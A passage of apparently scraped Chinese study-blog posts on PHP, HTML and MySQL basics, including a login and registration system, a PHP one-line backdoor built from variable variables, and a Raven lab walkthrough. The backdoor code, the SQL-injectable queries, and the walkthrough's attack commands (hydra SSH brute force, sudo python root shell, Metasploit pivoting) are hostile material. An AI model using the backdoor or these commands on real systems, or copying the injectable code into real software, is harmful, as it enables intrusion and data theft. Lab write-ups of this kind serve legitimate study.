\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508151414581.png)\n\n创建了user表，并且具有id，uname，pass字段\n\n#### 2、编写一个登录页面\n\n①编写代码\n\n```php+HTML\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>登录</title>\n</head>\n<body>\n    <form method=\"post\" action=\"\">\n        用户名: <input type=\"text\" name=\"username\"><br>\n        密码: <input type=\"password\" name=\"password\"><br>\n        <input type=\"submit\" value=\"登录\">\n    </form>\n\t<form method=\"get\" action=\"register.php\">\n\t<input type=\"submit\" value=\"注册\">\n\t</form>\n</body>\n```\n\n②效果展示\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508151435472.png)\n\n这个登录框有点丑陋\n\n③ai美化\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>登录</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n            box-sizing: border-box;\n            font-family: 'Arial', sans-serif;\n        }\n        body {\n            background-color: #f5f7fa;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            min-height: 100vh;\n            padding: 20px;\n        }\n        .container {\n            background-color: white;\n            border-radius: 10px;\n            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);\n            padding: 40px;\n            width: 100%;\n            max-width: 400px;\n        }\n        h2 {\n            text-align: center;\n            margin-bottom: 30px;\n            color: #333;\n        }\n        .form-group {\n            margin-bottom: 20px;\n        }\n        .form-group label {\n            display: block;\n            margin-bottom: 8px;\n            color: #555;\n            font-weight: 500;\n        }\n        .form-group input[type=\"text\"],\n        .form-group input[type=\"password\"] {\n            width: 100%;\n            padding: 12px;\n            border: 1px solid #ddd;\n            border-radius: 6px;\n            font-size: 16px;\n            transition: border-color 0.3s;\n        }\n        .form-group input[type=\"text\"]:focus,\n        .form-group input[type=\"password\"]:focus {\n            border-color: #4a90e2;\n            outline: none;\n            box-shadow: 0 0 0 2px rgba(74, 144, 226, 0.2);\n        }\n        .form-actions {\n            display: flex;\n            flex-direction: column;\n            gap: 15px;\n            margin-top: 30px;\n        }\n        .btn {\n            padding: 12px;\n            border: none;\n            border-radius: 6px;\n            font-size: 16px;\n            font-weight: 600;\n            cursor: pointer;\n            transition: background-color 0.3s, transform 0.1s;\n        }\n        .btn-primary {\n            background-color: #4a90e2;\n            color: white;\n        }\n        .btn-primary:hover {\n            background-color: #3a7bc8;\n        }\n        .btn-primary:active {\n            transform: scale(0.98);\n        }\n        .btn-secondary {\n            background-color: #f0f0f0;\n            color: #555;\n        }\n        .btn-secondary:hover {\n            background-color: #e0e0e0;\n        }\n        .btn-secondary:active {\n            transform: scale(0.98);\n        }\n        .error-message {\n            color: #e74c3c;\n            text-align: center;\n            margin-top: 20px;\n            padding: 10px;\n            border-radius: 6px;\n            background-color: #fadbd8;\n        }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <h2>用户登录</h2>\n        <form method=\"post\" action=\"\">\n            <div class=\"form-group\">\n                <label for=\"username\">用户名:</label>\n                <input type=\"text\" id=\"username\" name=\"username\" required>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"password\">密码:</label>\n                <input type=\"password\" id=\"password\" name=\"password\" required>\n            </div>\n            <div class=\"form-actions\">\n                <input type=\"submit\" class=\"btn btn-primary\" value=\"登录\">\n                <input type=\"button\" class=\"btn btn-secondary\" value=\"注册\" onclick=\"window.location.href='register.php'\">\n            </div>\n        </form>\n    </div>\n</html>\n```\n\n④美化效果\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508151437225.png)\n\n美化之后就比较顺眼\n\n⑤编写php处理逻辑\n\n```php+HTML\n<?php\n//数据库配置\n$servername = \"localhost\";\n$dbusername = \"root\";\n$dbpassword = \"root\";\n$dbname = \"cms\";\n\n//后端处理前端提交的参数\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    //建立数据库连接\n    $conn = @mysqli_connect($servername,$dbusername,$dbpassword,$dbname);\n    \n    //执行sql语句，查询unmae和pass，将结果赋值给变量数组$row\n    $sql = \"select uname,pass from user where username='$username'\"; \n    $result = mysqli_query($conn,$sql);\n    $row = mysqli_fetch_assoc($result);\n    \n    //判断是否存在用户，有则执行下一个if\n    if($row){\n        //如果密码正确，则成功登录，跳转到主页面\n        if($row['pass'] == $password){\n            echo \"登录成功\";\n            header(\"Location:good.html\");\n            exit;\n            \n            //输入密码和数据库中查询的密码不匹配，则报错\n        }else{\n            echo \"用户名或密码错误\";\n        }\n        \n        //如果不存在用户，则报错\n    }else{\n\t\techo \"用户名或密码错误\";\n\t\texit;\n\t}\n}    \n?>\n```\n\n将php代码整合到html，实现登录功能的前后端逻辑\n\n#### 3、登录页面引入注册功能\n\n①编写代码\n\n在登录页面已经设置了一个点击注册跳转，那么现在需要一个注册页面\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>注册</title>\n</head>\n<body>\n    <form method=\"post\" action=\"\">\n        用户名: <input type=\"text\" name=\"username\"><br>\n        密码: <input type=\"password\" name=\"password\"><br>\n        <input type=\"submit\" value=\"注册\">\n    </form>\n</body>\n```\n\n这是注册前端页面源代码，需要做个美化\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>注册</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n            box-sizing: border-box;\n            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n        }\n        \n        body {\n            background-color: #f5f7fa;\n            background-image: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            min-height: 100vh;\n            padding: 20px;\n        }\n        \n        .container {\n            background-color: white;\n            border-radius: 12px;\n            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);\n            padding: 40px;\n            width: 100%;\n            max-width: 400px;\n            transition: transform 0.3s ease;\n        }\n        \n        .container:hover {\n            transform: translateY(-5px);\n        }\n        \n        h2 {\n            text-align: center;\n            margin-bottom: 30px;\n            color: #333;\n            font-weight: 600;\n            position: relative;\n        }\n        \n        h2::after {\n            content: '';\n            position: absolute;\n            bottom: -10px;\n            left: 50%;\n            transform: translateX(-50%);\n            width: 50px;\n            height: 3px;\n            background-color: #4a90e2;\n            border-radius: 3px;\n        }\n        \n        .form-group {\n            margin-bottom: 25px;\n            position: relative;\n        }\n        \n        .form-group label {\n            display: block;\n            margin-bottom: 8px;\n            color: #555;\n            font-weight: 500;\n            font-size: 14px;\n        }\n        \n        .form-group input[type=\"text\"],\n        .form-group input[type=\"password\"] {\n            width: 100%;\n            padding: 12px 15px;\n            border: 1px solid #ddd;\n            border-radius: 6px;\n            font-size: 16px;\n            transition: all 0.3s ease;\n            background-color: #f9f9f9;\n        }\n        \n        .form-group input[type=\"text\"]:focus,\n        .form-group input[type=\"password\"]:focus {\n            border-color: #4a90e2;\n            outline: none;\n            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.2);\n            background-color: white;\n        }\n        \n        .btn {\n            width: 100%;\n            padding: 12px;\n            border: none;\n            border-radius: 6px;\n            font-size: 16px;\n            font-weight: 600;\n            cursor: pointer;\n            transition: all 0.3s ease;\n            background-color: #4a90e2;\n            color: white;\n            position: relative;\n            overflow: hidden;\n        }\n        \n        .btn:hover {\n            background-color: #3a7bc8;\n        }\n        \n        .btn:active {\n            transform: scale(0.98);\n        }\n        \n        .btn::after {\n            content: '';\n            position: absolute;\n            top: 50%;\n            left: 50%;\n            width: 5px;\n            height: 5px;\n            background: rgba(255, 255, 255, 0.5);\n            border-radius: 50%;\n            transform: translate(-50%, -50%);\n            opacity: 0;\n        }\n        \n        .btn:active::after {\n            animation: ripple 0.6s linear;\n        }\n        \n        @keyframes ripple {\n            0% {\n                width: 5px;\n                height: 5px;\n                opacity: 0.5;\n            }\n            100% {\n                width: 300px;\n                height: 300px;\n                opacity: 0;\n            }\n        }\n        \n        /* 响应式设计 */\n        @media (max-width: 480px) {\n            .container {\n                padding: 30px 20px;\n            }\n        }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <h2>用户注册</h2>\n        <form method=\"post\" action=\"\">\n            <div class=\"form-group\">\n                <label for=\"username\">用户名:</label>\n                <input type=\"text\" id=\"username\" name=\"username\" required>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"password\">密码:</label>\n                <input type=\"password\" id=\"password\" name=\"password\" required>\n            </div>\n            <button type=\"submit\" class=\"btn\">注册</button>\n        </form>\n    </div>\n</body>\n</html>\n```\n\n这是美化后的代码，看一下效果\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508151453627.png)\n\n②添加后端\n\n需要编写后端代码，来完善注册功能\n\n```php\n<?php\n$servername = \"localhost\";\n$dbusername = \"root\";\n$dbpassword = \"root\";\n$dbname = \"cms\";\n//处理前端输入数据\nif(isset($_POST['username']) && isset($_POST['password'])){\n\t@$username = $_POST['username'];\n\t@$password = $_POST['password'];\n\t//连接数据库\n    $conn = mysqli_connect($servername,$dbusername,$dbpassword,$dbname);\n\t$sql = \"select uname from user where uname = '$username'\";\n\t$result = mysqli_query($conn,$sql);\n\t$row = mysqli_fetch_assoc($result);\n\t//判断用户是否存在\n    if($row['uname'] != $username){ \n\t\t$sql = \"insert into cms.user(uname,pass) value ('$username','$password')\";\n\t    $result = mysqli_query($conn,$sql);\n\t\t$registerchack = true;\n\t    //注册成功跳转到登录页面\n        if($registerchack){\n\t\t    header('Location:/login.php',true,301);\n\t\t    exit();\n\t    }else{\n\t\t    echo \"注册失败\";\n\t    }\n\t}else{\n\t\techo \"用户名已存在\";\n\t\texit;\n\t}\t\n}\n?>\n```\n\n③效果验证\n\n输入用户名为admin，密码admin\n\n![image-20250815155448290](C:\\Users\\thy\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250815155448290.png)\n\n成功跳转，并成功创建了一个用户\n\n我们来验证输入重复用户名注册\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508151619479.png)\n\n显示用户名已存在\n"},{"title":"web练习3","url":"/2025/08/13/web练习3/","content":"\n\n\n#### 1、编写一个函数，要求可以根据前端传递的参数判断当前月份，要求传递的数字不符合1-12的规范时有报错提示\n\n①编写php代码\n\n```php\n<?php\n@$a = $_GET[\"a\"];\nif($a>=1 && $a<=12){\n\tswitch($a){\n\t\tcase 1:\n\t\techo \"January\";\n\t\tbreak;\n\t\tcase 2:\n\t\techo \"February\";\n\t\tbreak;\n\t\tcase 3:\n\t\techo \"March\";\n\t\tbreak;\n\t\tcase 4:\n\t\techo \"April\";\n\t\tbreak;\n\t\tcase 5:\n\t\techo \"May\";\n\t\tbreak;\n\t\tcase 6:\n\t\techo \"June\";\n\t\tbreak;\n\t\tcase 7:\n\t\techo \"July\";\n\t\tbreak;\n\t\tcase 8:\n\t\techo \"August\";\n\t\tbreak;\n\t\tcase 9:\n\t\techo \"September\";\n\t\tbreak;\n\t\tcase 10:\n\t\techo \"October\";\n\t\tbreak;\n\t\tcase 11:\n\t\techo \"November\";\n\t\tbreak;\n\t\tcase 12:\n\t\techo \"December\";\n\t\tbreak;\n\t}\n}else{\n\techo \"The input number is illegal\";\n}\n?>\n```\n\n②在网页验证\n\n在url栏输入?a=8和?a=19\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141604949.png)\n\n成功回显\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141605458.png)\n\n发生报错\n\n#### 2、编写一个函数，要求前端传递参数6，函数执行1+2+3+4+5+6，输出最终结果\n\n①编写php代码\n\n```php\n<?php\n@$a = $_GET[\"a\"];\n$i = 1;\n$b = 0;\nwhile($a>0){\n\t$b = $i + $b;\n\t$i++;\n\t$a--;\n}\necho $b;\n?>\n```\n\n②网页做验证\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141623966.png)\n\n成功回显\n\n#### 3、动态函数编写一个简单的后门\n\n①编写php代码\n\n```php\n<?php\n$A = \"G\";  //定义$A，赋值为字符G\n$B = \"ET\";  //定义$B，赋值为字符ET\n$C = \"_\".$A.$B;  //定义$C，将字符拼接，赋值给$C，$C此时被赋值字符串为“_GET”\n$D = $$C;  //定义$D，通过可变变量将$D赋值为超全局变量$_GET\n@$E = $D[\"a\"];  //定义$E接收前端传参a\n@$F = $D[\"b\"];  //定义$F接收前端传参b\n@$E($F);  //通过变形，达到$_GET[\"a\"]($_GET[\"b\"]),一个简单后门写好了\n?>\n```\n\n②网页验证\n\nurl输入?a=system&b=ipconfig，后端达到system(ipconfig)的效果\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141637013.png)\n\n#### 4、mysql数据库操作\n\n①cmd登录数据库，用户名root，密码root\n\n```bash\nmysql -uroot -proot\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141642330.png)\n\n②查看当前有哪些数据库\n\n```mysql\nshow databases;\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141644693.png)\n\n没有我们想要的库\n\n③创建数据库student\n\n```mysql\ncreate database student;\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141646752.png)\n\n成功创建数据库student\n\n④创建表user,以及字段id、name、tel，id设为主键\n\n```mysql\nuse student\ncreate table student.user(id int,name char(15),tel char(11),primary key(id));\ndesc student.user\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141657918.png)\n\n成功创建user表以及各字段\n\n#### 5、将信息写入字段，根据id查询\n\n①填入信息\n\n```mysql\ninsert into student.user(id,name,tel) value (1,'tianhengyu',13989898989);\n```\n\n其他信息改变value执行\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141708777.png)\n\n成功创建\n\n②查询数据，根据id\n\n```mysql\nselect * from student.user where id = 1;\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141710181.png)\n\n成功查询\n\n#### 6、select语句\n\n查询\n\n```mysql\n select column_name,table_name,table_schema from information_schema.columns;\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508141738191.png)\n\n成功查询到字段，所属的表和所属的库\n"},{"title":"web练习2","url":"/2025/08/12/web练习2/","content":"\n\n\n### 1、if语句\n\n当成绩在60以上时为及格，60以下时为不及格\n\n①编写php代码\n\n```php\n<?php\n\n$a = $_GET['a'];    //接受get传参a，赋值给变量$a\nif($a >= 60){       //判断语句，及格为PASS,不及格为FAIL\n\techo \"PASS\";\n}else{\n\techo \"FAIL\";\n}\n?>\n```\n\n②在url中输入?a=64，页面回显PASS\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813161647762.png)\n\n③在url中输入?a=55，页面回显FAIL\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813161815418.png)\n\n### 2、switch语句\n\n实现在浏览器端传递参数，number=1能够显示为一月，以及后续的月份\n\n①编写php代码\n\n```php\n<?php\n\n$a = $_GET['a'];   //接收get传参\nswitch($a){        //根据收到参数输出月份\n\tcase 1:\n\techo \"Jan\";\n\tbreak;\n\tcase 2:\n\techo \"Feb\";\n\tbreak;\n\tcase 3:\n\techo \"Mar\";\n\tbreak;\n\tcase 4:\n\techo \"Apr\";\n\tbreak;\n\tcase 5:\n\techo \"May\";\n\tbreak;\n\tcase 6:\n\techo \"Jun\";\n\tbreak;\n\tcase 7:\n\techo \"Jul\";\n\tbreak;\n\tcase 8:\n\techo \"Aug\";\n\tbreak;\n\tcase 9:\n\techo \"Sep\";\n\tbreak;\n\tcase 10:\n\techo \"Oct\";\n\tbreak;\n\tcase 11:\n\techo \"Nov\";\n\tbreak;\n\tcase 12:\n\techo \"Dec\";\n\tbreak;\n\tdefault:\n\techo \"Plase intput a value\";     //无参数输入则输出请输入一个值\n}\n?>\n```\n\n②在页面随便输入几个月份来验证，如2，4，6\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813165451694.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813165502827.png)\n\n③如果没有输入参数的话，验证回显\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813165517228.png)\n\n### 3、for循环\n\n打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字\n\n①编写php代码\n\n```php\n<?php\nfor($i=1;$i<=100;$i++){     //for循环输出1-100\n\tif($i % 17 == 0){       //如果是17的整数倍则跳过，使用continue跳过\n\t\techo \"  \";          //输出空格方便观看\n\t\tcontinue;\n\t}\n\techo $i;\n}\n?>\n```\n\n②上网页验证\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813165210488.png)\n\n### 4、Raven靶场\n\n测试环境\n\n| 主机                 | 网卡       | 地址            |\n| -------------------- | ---------- | --------------- |\n| kali（攻击机）       | nat        | 192.168.18.132  |\n| raven（服务器/内网） | nat/vmnet0 | 192.168.18.167/ |\n| win7（内网主机）     | vmnet0     |                 |\n\n①kali端先扫描本网段下存活的主机\n\n```bash\nnmap -sn 192.168.18.0/24  #扫描存活主机\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131836536.png)\n\n这里我们找到一个192.168.18.167的存活主机，并且有raven标识，推测应该是目标机器，我们去访问一下\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131838203.png)\n\n发现是一个web网站\n\n再扫描该主机开放端口及服务\n\n```bash\nnmap -A 192.168.18.167\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131851932.png)\n\n发现开启了关键的一个ssh服务，方便后续利用\n\n②尝试去爆破一下后台目录\n\n```bash\ndirb http://192.168.18.167    #爆破后台，kali自带工具\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131841318.png)\n\n发现一个疑似后台目录，并且使用的是wordpress开源内容管理系统框架\n\n③访问后台\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131847443.png)\n\n成功访问到后台\n\n④尝试爆破后台目录\n\nkali自带wpscan工具，专为wordpress设计，可以用来枚举用户\n\n```bash\nwpscan --url http://192.168.18.167/wordpress --wp-content-dir -at -eu\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131900582.png)\n\n此时我们发现了一个steven用户和michael用户\n\n此时枚举出用户之后我们就可以尝试去爆破密码，登录后台\n\n⑤爆破ssh服务\n\n既然有了账户，我们推测，服务器管理员会不会让系统账户和网站账户使用相同用户名呢\n\n测试一下去爆破ssh\n\n```bash\n#hydra九头蛇是一个强大的爆破工具\nhydra -l michael -P 1.txt ssh://192.168.18.167\nhydra -l steven -P 1.txt ssh://192.168.18.167\n\n-l指定用户名\n-L指定用户名字典\n-p指定密码\n-P指定密码字典\n\n我们在当前目前下创建一个密码字典1.txt\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131914743.png)\n\n![image-20250813191851279](C:\\Users\\thy\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250813191851279.png)\n\n我们爆破出来michael账户密码michael，steven账户密码pink84\n\n⑥ssh连接进行登录\n\n使用michael账户登录\n\n```bash\nssh michael@192.168.18.167\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131925057.png)\n\n我们成功远程连接到目标主机，接下来就可以开始找我们想要的东西\n\n查看网站根目录\n\n```bash\ncd /var/www\nls\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131928849.png)\n\n我们发现一个flag文件，我们打开看看\n\n```bash\ncat flag2.txt\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131929992.png)\n\n发现一串字符，如果这是ctf，恭喜你，可以拿去通关了\n\n我们进入到html这个网站目录\n\n```bash\ncd /html\nls\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131931726.png)\n\n发现一个这个网站wordpress根目录，里面肯定有重要信息，进去看看\n\n```bash\ncd wordpress\nls\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131933941.png)\n\n发现一个配置文件，wp-config.php，这个文件通常保存数据库等重要信息，我们打开看看\n\n```bash\ncat wp-config.php\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131936744.png)\n\n我们发现数据库Mysql的账户密码，看样子还是管理员账户，接下来去登录数据库\n\n```bash\nmysql -uroot -pR@v3nSecurity\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131938579.png)\n\n成功登录数据库，接下来就可以去查看数据库里的账户密码了\n\n```mysql\nshow databases;\nuse wordpress;\nshow tables;\nselect * from wp_users;\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131941957.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131942320.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131943997.png)\n\n我们发现了账户和密码，但是密码是加密过的，一时间不能解密，怎么办呢？？？？\n\n我们登录的是root用户，当然可以修改密码，我们修改michael的密码，然后去后台登录试试\n\n```mysql\nupdate wp_users set user_pass=md5('Admin123') where id=1;\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131945248.png)\n\n成功登录后台！！！！\n\n⑦ssh登录另一个账户，密码pink84\n\n```bash\nssh steven@192.168.18.167\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131948512.png)\n\n成功登录\n\n⑧查看可用权限\n\n```bash\nsudo -l    #查看当前用户可以使用sudo执行什么文件或者命令\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508131955767.png)\n\n我们发现可以执行python命令，python是一个强大的解释器，可以用来执行系统命令，因此我们可以使用python进行提权\n\n```bash\nsudo /usr/bin/python -c 'import os; os.system(\"/bin/bash\")'\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132000719.png)\n\n我们成功提权到root用户，等于是拿下了这台机器\n\n⑨网络嗅探\n\n拿下一台主机后，可以去查看网络配置情况，是否有其他网卡可以连接内网\n\n```bash\nip a\n或\nifconfig\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132003611.png)\n\n我们发现两个网卡，第二个网卡应该是通向内网，这里是靶场，所以我们应该去手动开启第二个网卡eth1\n\n```bash\necho \"auto eth1\" >> /etc/network/interfaces\necho \"iface eth1 inet dhcp\" >> /etc/network/interfaces\nifconfig eth1 up\nsystemctl restart networking\nip a\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132038995.png)\n\n我们查看到第二个网卡的ip，这个ip应该能访问内网\n\n⑩流量代理\n\n虽然看见了第二个网卡，但是拿下的服务器上没有攻击工具，并且kali不能访问到内网，所以我们需要做流量代理，将拿下的raven作为跳板\n\n```bash\n#新开一个终端\nmsfconsole\nuse auxiliary/scanner/ssh/ssh_login     #msf的一个攻击模块\nset username michael\nset password michael\nset rhosts 192.168.18.167\nrun\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132042404.png)\n\n获取sessions\n\n```\nsessions -l\nsessions -u 1\nsessions -i 2\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132044460.png)\n\n设置自动路由，将目标机器作为跳板\n\n```bash\nrun post/multi/manage/autoroute\nrun autoroute -p\nbackground\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132045039.png)\n\n可以看见我们的kali已经有了一个路由表\n\n我们需要再启动socks5服务\n\n```bash\nuse auxiliary/server/socks_proxy\noptions\nrun\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132047724.png)\n\n配置流量客户端工具，启动代理\n\n```bash\nvim /etc/proxychains4.conf\nsocks5 127.0.0.1 1080\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132050661.png)\n\n本来应该是通过nmap继续扫描159网段的存活主机，但是为了避免繁琐操作，直接去远程桌面连接win7，账户是administator，密码123456\n\n```bash\nproxychains rdesktop -u administrator -p 123456 192.168.159.130\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/202508132057670.png)\n\n成功连接\n\n## 扩展\n\n### 1、else if语句\n\n90-100为优秀，80-89良好，60-79及格,60以下不及格，如果数字不在0-100范围之内如何解决\n\n①编写代码\n\n```php\n<?php\n$a = @$_GET['a'];                    //接收传参   \nif($a>=90 && $a<=100){               //分数在90-100，不能以数学的形式来写，如1<a<5\n    echo \"best\";\n}else if($a>=80 && $a<90){           //分数在80-89\n\techo \"better\";\n}else if($a>=60 && $a<80){           //分数在60-79\n\techo \"pass\";\n}else if($a < 60){                   //分数小于60\n\techo \"fail\";\n}else{\n\techo \"plase int the score in 0-100\";    //当输入不合法时\n}\n?>\n```\n\n②在前端网页验证，输入95，85，70，，50，110（不合法）\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172612046.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172624865.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172622534.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172651706.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172659826.png)\n\n"},{"title":"web练习1","url":"/2025/08/11/web练习1/","content":"\n# 一、h5简介\n\nHyperTextMarkupLanguage（超文本标记语言），超文本包括：文字、图片、音频、视频、动画等\nHTML5作为最新版本，提供了一些新的元素和一些有趣的新特性，同时也建立了一些新的规则。这些元素、特性和规则的建立，提供了许多新的网页功能，如使用网页实现动态渲染图形、图表、图像和动画，以及不需要安装任何插件直接使用网页播放视频等。\n\n#### 1.HTML基本结构\n\n```HTML\n<!DOCTYPE>\n声明位于文档中的最前面的位置，处于<html>标签之前。<!DOCTYPE>声明不是一个HTML标签；它是用来告知Web浏览器页面使用了哪种HTML版本。\n\n<meta>\n设置网页的编码，SEO\n<metacharset=\"UTF-8\">\n<metaname=\"keywords\"content=\"是兄弟就来kan我\">\n```\n\n#### 2.网页的基本标签\n\n```HTML\n//标题标签\n//h1最大，h6最小\n<h1>X</h1>\n<h2>X</h2>\n<h3>X</h3>\n<h4>X</h4>\n<h5>X</h5>\n<h6>X</h6>\n\n//段落标签\n<p>yyds</p>\n\n//换行标签\n<br/>\n\n//水平线标签\n<hr/>\n\n//特殊符号\n<!DOCTYPEhtml>\n<htmllang=\"en\">\n<head>\n<metacharset=\"UTF-8\">\n<title>特殊符号</title>\n</head>\n<body>\n<!--空格-->\n<p>\nyyds<br/>\nyyds<br/>\nyy&nbsp;&nbsp;&nbsp;&nbsp;ds<br/>\n</p>\n<!--大于小于-->\n<p>\n><<br>\n&gt;&lt;\n</p>\n<!--引号-->\n<p>\n&quot;YUYU&quot;\n</p>\n<!--版权-->\n<p>\n&copy;YUYU\n</p>\n<!--&符号+xxx-->\n</body>\n</html>\n\n//图像标签\n//常见的图像格式：jpg、gif、png(受浏览器兼容性限制)\n<imgsrc=\"图片的位置\"alt=\"图片异常替代文字\"title=\"鼠标悬停文字\">\n\n//链接标签\n//页面间链接：从一个页面链接到另外一个页面\n<ahref=\"path\"target=\"_self\">文本或者图像</a>\n<ahref=\"path\"target=\"_blank\">文本或者图像</a>\n\n//锚链接\n//ctrl+d复制当前行到下一行\n<aname=\"top\">顶部</a>\n<aherf=\"#top\">跳转到顶部</a>\n```\n\n\n\n## 二、练习\n\n### 1、html页面\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>田珩瑀</title> //网页标签\n</head>\n<body>\n    <img src=\"1.png\" alt=\"狮子图片\" title=\"这是狮子\">  //图片保存在了页面同级目录下\n\t<br \\>\n\t<br \\>\n    <form method=\"GET\" action=\"1.php\">\n\t<input type=\"text\" name=\"name\">账户1<br \\>\n\t<input type=\"password\" name=\"pass\">密码2<br \\>\n\t<input type=\"submit\" value=\"提交\">\n\t</form>\n</body>\n</html>\n```\n\n这是网页实体效果\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812162500867.png)\n\n这是编写的后端php代码，也是保存在网页同级目录下\n\n```php\n<?php\n$name = $_GET['name'];    //接受get传参数据\n$password = $_GET['pass'];   //接受get传参数据\necho $name;\necho \"<br \\>\";\necho $password;\necho \"<br \\>\";\n?>\n```\n\n①使用GET传参\n\n代码同上，在表单处输入数据并提交\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812162910740.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812162942331.png)\n\n成功在传到后端，在url显示数据，并输出到页面！！！！\n\n②POST传参\n\n修改html文件和php文件的代码，将方法改为POST\n\n```php\n#html\n<form method=\"POST\" action=\"1.php\">\n\n#php\n$name = $_POST['name'];\n$password = $_POST['pass'];\n```\n\n修改好之后，在表单处输入数据并提交\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812163357927.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812163739197.png)\n\n成功显示，并且url不包含数据！！！！！\n\n### 2、php定义变量\n\n在刚才的php代码中加入如下代码\n\n```php\n$thy = \"tianhengyu\"; //定义了一个变量名为thy，数据为字符串tianhengyu\necho $thy;   //输出数据\n```\n\n添加好代码后保存，刷新页面\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812164248433.png)\n\n成功打印！！！！！\n\n### 3、修改变量值为int类型\n\n```php\n$thy = 456789;   